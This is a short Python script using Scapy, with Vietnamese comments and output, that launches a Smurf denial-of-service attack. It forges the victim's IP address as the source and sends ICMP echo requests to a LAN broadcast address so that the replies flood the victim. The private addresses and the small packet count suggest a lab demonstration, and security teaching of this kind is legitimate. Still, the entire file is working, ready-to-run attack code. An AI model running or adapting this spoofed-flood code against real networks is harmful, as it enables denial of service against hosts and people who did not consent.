#!/usr/bin/env python3
# smurf_attack.py - Phat dong tan cong Smurf Attack bang ICMP Broadcast Amplification
import time
from scapy.all import *

victim_ip = "10.0.0.200"
broadcast_ip = "10.0.0.255"
packet_count = 10

print("==================================================================")
print("[*] PHÁT ĐỘNG TẤN CÔNG TỪ CHỐI DỊCH VỤ SMURF ATTACK")
print("==================================================================")
print(f"[*] Mục tiêu nạn nhân (Victim):    {victim_ip}")
print(f"[*] Địa chỉ Broadcast mạng LAN:     {broadcast_ip}")
print(f"[*] Số gói ICMP phát đi:            {packet_count} gói")
print(f"[*] Địa chỉ IP nguồn bị giả mạo:    {victim_ip} (chính là Nạn nhân!)")
print("==================================================================")
print("[*] Cơ chế: 1 gói gửi tới Broadcast -> Nhiều máy trong mạng phản hồi")
print("    Toàn bộ phản hồi sẽ dội thẳng vào máy Nạn nhân làm nghẽn mạng!\n")

print(f"[*] Đang bắn {packet_count} gói ICMP Echo Request tới địa chỉ Broadcast...")
send(IP(src=victim_ip, dst=broadcast_ip)/ICMP(), count=packet_count, verbose=0)

print(f"\n[+] ĐÃ PHÁT ĐỘNG XONG! Hãy quan sát terminal của máy Victim (vic).")
print(f"    Bạn sẽ thấy một 'cơn mưa' gói tin Echo Reply dội về máy nạn nhân!")

